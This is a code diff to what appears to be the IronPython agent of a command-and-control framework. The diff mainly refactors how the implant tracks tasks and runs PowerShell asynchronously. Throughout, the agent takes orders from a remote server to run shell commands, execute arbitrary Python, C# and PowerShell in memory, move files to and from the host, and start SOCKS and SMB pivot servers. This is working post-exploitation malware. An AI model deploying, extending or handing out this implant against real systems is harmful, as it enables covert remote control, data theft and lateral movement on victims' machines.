@@ -36,6 +36,8 @@ from System.Security.Principal import (WindowsBuiltInRole, WindowsIdentity,
 
 clr.AddReference("System.Management.Automation")
 from System.Management.Automation import Runspaces
+from System.Management.Automation import PowerShell, PSDataCollection, PSObject, DataAddedEventArgs
+from System.Management.Automation.Runspaces import RunspaceFactory
 
 ################################################
 #
@@ -44,7 +46,6 @@ from System.Management.Automation import Runspaces
 ################################################
 moduleRepo = {}
 _meta_cache = {}
-
 
 def old_div(a, b):
     """
@@ -180,10 +181,10 @@ class CFinder(object):
 ################################################
 class Server(secretsocks.Server):
     # Initialize our data channel
-    def __init__(self, q, resultID):
+    def __init__(self, q, result_id):
         secretsocks.Server.__init__(self)
         self.queue = q
-        self.resultID = resultID
+        self.result_id = result_id
         self.alive = True
         self.start()
 
@@ -205,7 +206,7 @@ class Server(secretsocks.Server):
                 data = self.writebuf.get(timeout=10)
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
-                        61, base64.b64encode(data).decode("UTF-8"), self.resultID
+                        61, base64.b64encode(data).decode("UTF-8"), self.result_id
                     )
                 )
             except Queue.Empty:
@@ -400,10 +401,10 @@ class MainAgent:
         self.defaultResponse = base64.b64decode("")
         self.packet_handler.missedCheckins = 0
         self.sessionID = session_id
-        self.jobMessageBuffer = ""
+        self.job_message_buffer = ""
         self.socksthread = False
         self.socksqueue = None
-        self.jobs = {}
+        self.tasks = {}
 
         parts = self.profile.split("|")
         self.userAgent = parts[1]
@@ -425,24 +426,23 @@ class MainAgent:
 
     def agent_exit(self):
         # exit for proper job / thread cleanup
-        if len(self.jobs) > 0:
+        if len(self.tasks) > 0:
             try:
-                for x in self.jobs:
-                    self.jobs[x].kill()
-                    self.jobs.pop(x)
+                for x in self.tasks:
+                    self.tasks[x]['thread'].kill()
             except:
                 # die hard if thread kill fails
                 pass
         sys.exit()
 
     def send_job_message_buffer(self):
-        if len(self.jobs) > 0:
+        if self.job_message_buffer != "":
             result = self.get_job_message_buffer()
             self.packet_handler.process_job_tasking(result)
         else:
             pass
 
-    def run_prebuilt_command(self, data, resultID):
+    def run_prebuilt_command(self, data, result_id):
         """
         Run a command on the system and return the results.
         Task 40
@@ -450,15 +450,17 @@ class MainAgent:
         parts = data.split(" ")
         if len(parts) == 1:
             data = parts[0]
-            resultData = str(self.run_command(data))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, resultData, resultID))
+            result_data = str(self.run_command(data))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
         else:
             cmd = parts[0]
             cmdargs = " ".join(parts[1: len(parts)])
-            resultData = str(self.run_command(cmd, cmdargs=cmdargs))
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, resultData, resultID))
+            result_data = str(self.run_command(cmd, cmdargs=cmdargs))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(40, result_data, result_id))
 
-    def file_download(self, data, resultID):
+        self.tasks[result_id]["status"] = "completed"
+
+    def file_download(self, data, result_id):
         """
         Download a file from the server.
         Task 41
@@ -468,7 +470,7 @@ class MainAgent:
         if not os.path.exists(objPath):
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    40, "file does not exist or cannot be accessed", resultID
+                    40, "file does not exist or cannot be accessed", result_id
                 )
             )
 
@@ -501,7 +503,7 @@ class MainAgent:
                 if not encodedPart or encodedPart == "" or len(encodedPart) == 16:
                     break
 
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(41, partData, resultID))
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(41, partData, result_id))
 
                 minSleep = int((1.0 - self.jitter) * self.delay)
                 maxSleep = int((1.0 + self.jitter) * self.delay)
@@ -510,7 +512,9 @@ class MainAgent:
                 partIndex += 1
                 offset += 512000
 
-    def file_upload(self, data, resultID):
+        self.tasks[result_id]["status"] = "completed"
+
+    def file_upload(self, data, result_id):
         """
         Upload a file to the server.
         Task 42
@@ -524,20 +528,23 @@ class MainAgent:
                 f.write(raw)
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    42, "[*] Upload of %s successful" % (filePath), resultID
+                    42, "[*] Upload of %s successful" % (filePath), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
                     0,
                     "[!] Error in writing file %s during upload: %s"
                     % (filePath, str(e)),
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def directory_list(self, data, resultID):
+    def directory_list(self, data, result_id):
         """
         List a directory on the target.
         Task 43
@@ -554,7 +561,7 @@ class MainAgent:
         if not os.path.isdir(path):
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    43, "Directory {} not found.".format(path), resultID
+                    43, "Directory {} not found.".format(path), result_id
                 )
             )
         items = []
@@ -572,9 +579,10 @@ class MainAgent:
             }
         )
 
-        self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, resultID))
+        self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, result_id))
+        self.tasks[result_id]["status"] = "completed"
 
-    def csharp_execute(self, data, resultID):
+    def csharp_execute(self, data, result_id):
         """
         Execute C# module in ironpython using reflection
         Task 44
@@ -604,7 +612,7 @@ class MainAgent:
                 results = (
                     assembly.GetType("Task").GetMethod("Execute").Invoke(None, params)
                 )
-                result_packet = self.packet_handler.build_response_packet(110, str(results), resultID)
+                result_packet = self.packet_handler.build_response_packet(110, str(results), result_id)
                 self.packet_handler.process_job_tasking(result_packet)
 
             else:
@@ -654,48 +662,80 @@ class MainAgent:
                     stream_text = read[0:count]
                     pipeOutput.Append(stream_text)
 
-                result_packet = self.packet_handler.build_response_packet(110, str(pipeOutput), resultID)
+                result_packet = self.packet_handler.build_response_packet(110, str(pipeOutput), result_id)
                 self.packet_handler.process_job_tasking(result_packet)
+
+            self.tasks[result_id]["status"] = "completed"
 
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    0, "error executing specified Python data %s " % (e), resultID
+                    0, "error executing specified Python data %s " % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def job_list(self, resultID):
+    def task_list(self, result_id):
         """
-        Return a list of all running agent.jobs.
+        Return a list of all running agent jobs as a formatted table.
+        TODO: Return JSON instead of a table.
+
         Task 50
         """
-        msg = "Active agent.jobs:\n"
+        self.tasks[result_id]["status"] = "completed"
 
-        for key in self.jobs:
-            msg += "Task %s" % key
-        self.packet_handler.send_message(self.packet_handler.build_response_packet(50, msg, resultID))
+        filtered_tasks = {
+            task_id: {
+                "status": task_info.get("status", "N/A")
+            } for task_id, task_info in self.tasks.items()
+        }
 
-    def stop_job(self, jobID, resultID):
+        headers = ["Task ID", "Status"]
+        rows = [[task_id, task_info["status"]] for task_id, task_info in filtered_tasks.items()]
+        column_widths = [max(len(str(item)) for item in col) for col in zip(*([headers] + rows))]
+        separator = ' | '.join('-' * width for width in column_widths)
+        header_line = ' | '.join(headers[i].ljust(column_widths[i]) for i in range(len(headers)))
+
+        table_lines = [header_line, separator]
+        for row in rows:
+            row_line = ' | '.join(str(row[i]).ljust(column_widths[i]) for i in range(len(row)))
+            table_lines.append(row_line)
+
+        tasks_table = '\n'.join(table_lines)
+        self.packet_handler.send_message(self.packet_handler.build_response_packet(50, tasks_table, result_id))
+
+    def stop_task(self, job_to_kill, result_id):
         """
         Stop a running job.
         Task 51
         """
         try:
-            self.jobs[int(jobID)].kill()
-            self.jobs.pop(int(jobID))
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    51, "[+] Job thread %s stopped successfully" % (jobID), resultID
+            if self.tasks[job_to_kill]['thread'].is_alive():
+                self.tasks[job_to_kill]['thread'].kill()
+                self.tasks[job_to_kill]['status'] = "stopped"
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        51, "[+] Job thread %s stopped successfully" % (job_to_kill), result_id
+                    )
                 )
-            )
+            else:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        51, "[!] Job thread %s already stopped" % (job_to_kill), result_id
+                    )
+                )
+
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    51, "[!] Error stopping job thread: %s" % (e), resultID
+                    51, "[!] Error stopping job thread: %s" % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def start_socks_server(self, resultID):
+    def start_socks_server(self, result_id):
         """
         Start a SOCKS server on the target.
         Task 60
@@ -704,34 +744,39 @@ class MainAgent:
         if not self.socksthread:
             try:
                 self.socksqueue = Queue.Queue()
-                self.jobs[resultID] = KThread(
+                self.tasks[result_id]['thread'] = KThread(
                     target=Server,
                     args=(
                         self.socksqueue,
-                        resultID,
+                        result_id,
                     ),
                 )
-                self.jobs[resultID].daemon = True
-                self.jobs[resultID].start()
+                self.tasks[result_id]['thread'].daemon = True
+                self.tasks[result_id]['thread'].start()
                 self.socksthread = True
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
-                        60, "[+] SOCKS server successfully started", resultID
+                        60, "[+] SOCKS server successfully started", result_id
                     )
                 )
+                self.tasks[result_id]["status"] = "running"
+
             except:
                 self.socksthread = False
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
-                        60, "[!] SOCKS server failed to start", resultID
+                        60, "[!] SOCKS server failed to start", result_id
                     )
                 )
+                self.tasks[result_id]["status"] = "error"
+
         else:
             self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(60, "[!] SOCKS server already running", resultID)
+                self.packet_handler.build_response_packet(60, "[!] SOCKS server already running", result_id)
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def start_smb_pipe_server(self, data, resultID):
+    def start_smb_pipe_server(self, data, result_id):
         """
         Start an SMB pipe server on the target.
         Task 70
@@ -807,8 +852,9 @@ class MainAgent:
         server_thread = KThread(target=server_thread_function, args=(pipe_name, hop_name,))
         server_thread.daemon = True
         server_thread.start()
+        self.tasks[result_id]["status"] = "running"
 
-    def dynamic_code_execute_wait_nosave(self, data, resultID):
+    def dynamic_code_execute_wait_nosave(self, data, result_id):
         """
         Execute dynamic code and wait for the results without saving output.
         Task 100
@@ -820,17 +866,19 @@ class MainAgent:
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             results = buffer.getvalue()
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(results), resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(results), result_id))
+            self.tasks[result_id]["status"] = "completed"
         except Exception as e:
             errorData = str(buffer.getvalue())
-            return self.packet_handler.build_response_packet(
+            self.packet_handler.build_response_packet(
                 0,
                 "error executing specified Python data: %s \nBuffer data recovered:\n%s"
                 % (e, errorData),
-                resultID,
+                result_id,
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def dynamic_code_execution_wait_save(self, data, resultID):
+    def dynamic_code_execution_wait_save(self, data, result_id):
         """
         Execute dynamic code and wait for the results while saving output.
         Task 101
@@ -856,9 +904,11 @@ class MainAgent:
                     "{0: <15}".format(prefix)
                     + "{0: <5}".format(extension)
                     + encodedPart,
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             # Also return partial code that has been executed
             errorData = buffer.getvalue()
@@ -867,11 +917,12 @@ class MainAgent:
                     0,
                     "error executing specified Python data %s \nBuffer data recovered:\n%s"
                     % (e, errorData),
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def disk_code_execution_wait_save(self, data, resultID):
+    def disk_code_execution_wait_save(self, data, result_id):
         """
         Execute on disk code and wait for the results while saving output.
         For modules that require multiprocessing not supported by exec
@@ -902,7 +953,9 @@ class MainAgent:
                 result += "\n\nError removing module file, please verify path: " + str(
                     implantPath
                 )
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(result), resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(result), result_id))
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
@@ -911,38 +964,87 @@ class MainAgent:
                         0,
                         "error executing specified Python data: %s \nError removing module file, please verify path: %s"
                         % (e, implantPath),
-                        resultID,
+                        result_id,
                     )
                 )
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    0, "error executing specified Python data: %s" % (e), resultID
+                    0, "error executing specified Python data: %s" % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def powershell_task(self, data, resultID):
+    def powershell_task(self, data, result_id):
         """
         Execute a PowerShell command.
         Task 112
         """
-        import sys
+        from System import AppDomain
+        clr.AddReference("System.Management.Automation")
+        from System.Management.Automation import PowerShell, PSDataCollection, PSObject, DataAddedEventArgs
+
         data = data.lstrip("\x00")
-        # todo: make this a job a thread to be trackable
-        # powershell task
-        myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
-        myrunspace.Open()
-        pipeline = myrunspace.CreatePipeline()
-        pipeline.Commands.AddScript(data)
-        results = pipeline.Invoke()
-        buffer = StringIO()
-        sys.stdout = buffer
-        for result in results:
-            print(result)
-        sys.stdout = sys.__stdout__
-        result_packet = self.packet_handler.build_response_packet(110, str(buffer.getvalue()), resultID)
+        # Generate a random name
+        rand_name = ''.join(random.choice("ABCDEFGHKLMNPRSTUVWXYZ123456789") for _ in range(6))
+
+        # Create a new AppDomain
+        app_domain = AppDomain.CreateDomain(rand_name)
+
+        # Directly create the PowerShell instance
+        ps_host = PowerShell.Create()
+
+        # Add the target script into the new runspace/appdomain
+        ps_host.AddScript(data)
+
+        # Create a buffer for output collection
+        buffer = PSDataCollection[PSObject]()
+
+        # Subscribe to the DataAdded event
+        buffer.DataAdded += lambda sender, event_args: self.data_added_handler(sender, event_args, result_id)
+
+        # Kick off asynchronous execution
+        ps_host_exec = ps_host.BeginInvoke(buffer, buffer)
+        thread = KThread(target=self.wait_for_powershell_job, args=(result_id,))
+        thread.start()
+
+        self.tasks[result_id] = {'app_domain': app_domain,
+                               'ps_host': ps_host,
+                               'thread': thread,
+                               'buffer': buffer,
+                               'ps_host_exec': ps_host_exec
+                                 }
+
+        result_packet = self.packet_handler.build_response_packet(110, "Job Started: %s" % (result_id), result_id)
+        self.packet_handler.process_job_tasking(result_packet)
+        self.tasks[result_id]["status"] = "running"
+
+    def data_added_handler(self, sender, event_args, result_id):
+        buffer = sender
+        index = event_args.Index
+        item = buffer[index]
+        result_packet = self.packet_handler.build_response_packet(110, str(item), result_id)
         self.packet_handler.process_job_tasking(result_packet)
 
-    def powershell_task_dyanmic_code_wait_nosave(self, data, resultID):
+    def wait_for_powershell_job(self, result_id):
+        try:
+            ps_host_exec = self.tasks[result_id]['ps_host_exec']
+            ps_host = self.tasks[result_id]['ps_host']
+
+            # Wait for the job to complete
+            ps_host.EndInvoke(ps_host_exec)
+
+            # Remove from job list
+            self.tasks[result_id]['status'] = "completed"
+
+        except Exception as e:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0, "Error waiting for job:" % (e), result_id
+                )
+            )
+            self.tasks[result_id]["status"] = "error"
+
+    def powershell_task_dyanmic_code_wait_nosave(self, data, result_id):
         """
         Execute a PowerShell command and wait for the results without saving output.
         Task 118
@@ -950,7 +1052,6 @@ class MainAgent:
         try:
             data = data.lstrip("\x00")
 
-            # powershell task
             myrunspace = Runspaces.RunspaceFactory.CreateRunspace()
             myrunspace.Open()
             pipeline = myrunspace.CreatePipeline()
@@ -961,18 +1062,20 @@ class MainAgent:
             for result in results:
                 print(result)
 
-            result_packet = self.packet_handler.build_response_packet(110, str(result), resultID)
+            result_packet = self.packet_handler.build_response_packet(110, str(result), result_id)
             self.packet_handler.process_job_tasking(result_packet)
+            self.tasks[result_id]["status"] = "completed"
 
         except Exception as e:
             print(e)
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    0, "error executing specified Python data %s " % (e), resultID
+                    0, "error executing specified Python data %s " % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def script_command(self, data, resultID):
+    def script_command(self, data, result_id):
         """
         Execute a base64 encoded script.
         Task 121
@@ -985,7 +1088,9 @@ class MainAgent:
             exec(code_obj, globals())
             sys.stdout = sys.__stdout__
             result = str(buffer.getvalue())
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(121, result, resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(121, result, result_id))
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             errorData = str(buffer.getvalue())
             self.packet_handler.send_message(
@@ -993,11 +1098,12 @@ class MainAgent:
                     0,
                     "error executing specified Python data %s \nBuffer data recovered:\n%s"
                     % (e, errorData),
-                    resultID,
+                    result_id,
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def script_load(self, data, resultID):
+    def script_load(self, data, result_id):
         """
         Load a script into memory.
         Task 122
@@ -1012,34 +1118,40 @@ class MainAgent:
             if not dec_data["crc32_check"]:
                 self.packet_handler.send_message(
                     self.packet_handler.build_response_packet(
-                        122, "Failed crc32_check during decompression", resultID
+                        122, "Failed crc32_check during decompression", result_id
                     )
                 )
+                self.tasks[result_id]["status"] = "error"
+
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    122, "Unable to decompress zip file: %s" % (e), resultID
+                    122, "Unable to decompress zip file: %s" % (e), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
         zdata = dec_data["data"]
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
         if fileName in list(moduleRepo.keys()):
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    122, "%s module already exists" % (fileName), resultID
+                    122, "%s module already exists" % (fileName), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
+
         else:
             moduleRepo[fileName] = zf
             self.install_hook(fileName)
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    122, "Successfully imported %s" % (fileName), resultID
+                    122, "Successfully imported %s" % (fileName), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "completed"
 
-    def view_loaded_modules(self, data, resultID):
+    def view_loaded_modules(self, data, result_id):
         """
         View loaded modules.
         Task 123
@@ -1052,17 +1164,22 @@ class MainAgent:
                 loadedModules += "\n----" + key + "----\n"
                 loadedModules += "\n".join(moduleRepo[key].namelist())
 
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, resultID))
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, result_id))
+            self.tasks[result_id]["status"] = "completed"
+
         else:
             try:
                 loadedModules = "\n----" + repoName + "----\n"
                 loadedModules += "\n".join(moduleRepo[repoName].namelist())
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, resultID))
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, result_id))
+                self.tasks[result_id]["status"] = "completed"
+
             except Exception as e:
                 msg = "Unable to retrieve repo contents: %s" % (str(e))
-                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, msg, resultID))
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, msg, result_id))
+                self.tasks[result_id]["status"] = "error"
 
-    def remove_module(self, data, resultID):
+    def remove_module(self, data, result_id):
         """
         Remove a module.
         """
@@ -1072,34 +1189,38 @@ class MainAgent:
             del moduleRepo[repoName]
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    124, "Successfully remove repo: %s" % (repoName), resultID
+                    124, "Successfully remove repo: %s" % (repoName), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             self.packet_handler.send_message(
                 self.packet_handler.build_response_packet(
-                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID
+                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), result_id
                 )
             )
+            self.tasks[result_id]["status"] = "error"
 
-    def start_job(self, code, resultID):
+    def start_python_job(self, code, result_id):
         # create a new code block with a defined method name
-        codeBlock = "def method():\n" + indent(code[1:])
+        code_block = "def method():\n" + indent(code)
 
         # register the code block
-        code_obj = compile(codeBlock, "<string>", "exec")
+        code_obj = compile(code_block, "<string>", "exec")
         # code needs to be in the global listing
         # not the locals() scope
         exec(code_obj, globals())
 
         # create/process Packet start/return the thread
         # call the job_func so sys data can be captured
-        codeThread = KThread(target=self.job_func, args=(resultID,))
-        codeThread.start()
+        code_thread = KThread(target=self.python_job_func, args=(result_id,))
+        code_thread.start()
 
-        self.jobs[resultID] = codeThread
+        self.tasks[result_id]['thread'] = code_thread
+        self.tasks[result_id]["status"] = "running"
 
-    def job_func(self, resultID):
+    def python_job_func(self, result_id):
         try:
             buffer = StringIO()
             sys.stdout = buffer
@@ -1107,25 +1228,28 @@ class MainAgent:
             # and capture the output via sys
             method()
             sys.stdout = sys.__stdout__
-            dataStats_2 = buffer.getvalue()
-            result = self.packet_handler.build_response_packet(110, str(dataStats_2), resultID)
+            data_stats = buffer.getvalue()
+            result = self.packet_handler.build_response_packet(110, str(data_stats), result_id)
             self.packet_handler.process_job_tasking(result)
+            self.tasks[result_id]["status"] = "completed"
+
         except Exception as e:
             p = "error executing specified Python job data: " + str(e)
-            result = self.packet_handler.build_response_packet(0, p, resultID)
+            result = self.packet_handler.build_response_packet(0, p, result_id)
             self.packet_handler.process_job_tasking(result)
+            self.tasks[result_id]["status"] = "error"
 
     def job_message_buffer(self, message):
         # Supports job messages for checkin
         try:
-            self.jobMessageBuffer += str(message)
+            self.job_message_buffer += str(message)
         except Exception as e:
             print(e)
 
     def get_job_message_buffer(self):
         try:
-            result = self.packet_handler.build_response_packet(110, str(self.jobMessageBuffer))
-            self.jobMessageBuffer = ""
+            result = self.packet_handler.build_response_packet(110, str(self.job_message_buffer))
+            self.job_message_buffer = ""
             return result
         except Exception as e:
             return self.packet_handler.build_response_packet(0, "[!] Error getting job output: %s" % (e))
@@ -1392,113 +1516,141 @@ class MainAgent:
         nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language,
         pyVersion, architecture)
 
-    def process_packet(self, packetType, data, resultID):
+    def process_packet(self, packet_type, data, result_id):
         try:
-            packetType = int(packetType)
+            packet_type = int(packet_type)
+            if packet_type == 61:
+                # Avoids tracking temp tasks
+                self.socksqueue.put(base64.b64decode(data.encode("UTF-8")))
+                return
+
+            else:
+                self.tasks[result_id] = {
+                    "result_id": result_id,
+                    "packet_type": packet_type,
+                    "status": "started",
+                    "thread": None,
+                    "language": None,
+                    "powershell":
+                        {
+                            "app_domain": None,
+                            "ps_host": None,
+                            "buffer": None,
+                            "ps_host_exec": None
+                        }
+                }
+
+            if packet_type == 1:
+                # sysinfo request
+                # get_sysinfo should be exposed from stager.py
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(1, self.get_sysinfo(server=self.server), result_id))
+                self.tasks[result_id]["status"] = "completed"
+
+            elif packet_type == 2:
+                # agent exit
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(2, "", result_id))
+                self.agent_exit()
+
+            elif packet_type == 34:
+                # TASK_SET_PROXY
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 40:
+                self.run_prebuilt_command(data, result_id)
+
+            elif packet_type == 41:
+                self.file_download(data, result_id)
+
+            elif packet_type == 42:
+                self.file_upload(data, result_id)
+
+            elif packet_type == 43:
+                self.directory_list(data, result_id)
+
+            elif packet_type == 44:
+                self.csharp_execute(data, result_id)
+
+            elif packet_type == 50:
+                self.task_list(result_id)
+
+            elif packet_type == 51:
+                self.stop_task(data, result_id)
+
+            elif packet_type == 60:
+                self.start_socks_server(result_id)
+
+            elif packet_type == 70:
+                self.start_smb_pipe_server(data, result_id)
+
+            elif packet_type == 100:
+                self.dynamic_code_execute_wait_nosave(data, result_id)
+
+            elif packet_type == 101:
+                self.dynamic_code_execution_wait_save(data, result_id)
+
+            elif packet_type == 102:
+                self.disk_code_execution_wait_save(data, result_id)
+
+            elif packet_type == 110:
+                self.start_python_job(data, result_id)
+
+            elif packet_type == 111:
+                # TASK_CMD_JOB_SAVE
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 112:
+                self.powershell_task(data, result_id)
+
+            elif packet_type == 118:
+                self.powershell_task_dyanmic_code_wait_nosave(data, result_id)
+
+            elif packet_type == 119:
+                self.tasks[result_id]["status"] = "unimplemented"
+                pass
+
+            elif packet_type == 121:
+                self.script_command(data, result_id)
+
+            elif packet_type == 122:
+                self.script_load(data, result_id)
+
+            elif packet_type == 123:
+                self.view_loaded_modules(data, result_id)
+
+            elif packet_type == 124:
+                self.remove_module(data, result_id)
+
+            elif packet_type == 130:
+                # Dynamically update agent comms
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        60, "[!] Switch agent comms not implemented", result_id
+                    )
+                )
+                self.tasks[result_id]["status"] = "unimplemented"
+
+            elif packet_type == 131:
+                # Update the listener name variable
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        60, "[!] Switch agent comms not implemented", result_id
+                    )
+                )
+                self.tasks[result_id]["status"] = "unimplemented"
+
+            else:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(0, "invalid tasking ID: %s" % (packet_type), result_id)
+                )
+                self.tasks[result_id]["status"] = "error"
+
         except Exception as e:
-            return None
-
-        if packetType == 1:
-            # sysinfo request
-            # get_sysinfo should be exposed from stager.py
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(1, self.get_sysinfo(server=self.server), resultID))
-
-        elif packetType == 2:
-            # agent exit
-            self.packet_handler.send_message(self.packet_handler.build_response_packet(2, "", resultID))
-            self.agent_exit()
-
-        elif packetType == 34:
-            # TASK_SET_PROXY
-            pass
-
-        elif packetType == 40:
-            self.run_prebuilt_command(data, resultID)
-
-        elif packetType == 41:
-            self.file_download(data, resultID)
-
-        elif packetType == 42:
-            self.file_upload(data, resultID)
-
-        elif packetType == 43:
-            self.directory_list(data, resultID)
-
-        elif packetType == 44:
-            self.csharp_execute(data, resultID)
-
-        elif packetType == 50:
-            self.job_list(resultID)
-
-        elif packetType == 51:
-            self.stop_job(data, resultID)
-
-        elif packetType == 60:
-            self.start_socks_server(resultID)
-
-        elif packetType == 61:
-            self.socksqueue.put(base64.b64decode(data.encode("UTF-8")))
-
-        elif packetType == 70:
-            self.start_smb_pipe_server(data, resultID)
-
-        elif packetType == 100:
-            self.dynamic_code_execute_wait_nosave(data, resultID)
-
-        elif packetType == 101:
-            self.dynamic_code_execution_wait_save(data, resultID)
-
-        elif packetType == 102:
-            self.disk_code_execution_wait_save(data, resultID)
-
-        elif packetType == 110:
-            self.start_job(data, resultID)
-
-        elif packetType == 111:
-            # TASK_CMD_JOB_SAVE
-            pass
-
-        elif packetType == 112:
-            self.powershell_task(data, resultID)
-
-        elif packetType == 118:
-            self.powershell_task_dyanmic_code_wait_nosave(data, resultID)
-
-        elif packetType == 119:
-            pass
-
-        elif packetType == 121:
-            self.script_command(data, resultID)
-
-        elif packetType == 122:
-            self.script_load(data, resultID)
-
-        elif packetType == 123:
-            self.view_loaded_modules(data, resultID)
-
-        elif packetType == 124:
-            self.remove_module(data, resultID)
-
-        elif packetType == 130:
-            # Dynamically update agent comms
             self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    60, "[!] Switch agent comms not implemented", resultID
-                )
+                self.packet_handler.build_response_packet(0, "error processing packet: %s" % (e), result_id)
             )
-
-        elif packetType == 131:
-            # Update the listener name variable
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(
-                    60, "[!] Switch agent comms not implemented", resultID
-                )
-            )
-
-        else:
-            self.packet_handler.send_message(
-                self.packet_handler.build_response_packet(0, "invalid tasking ID: %s" % (packetType), resultID)
-            )
+            self.tasks[result_id]["status"] = "error"
 
     def run(self):
         while True:
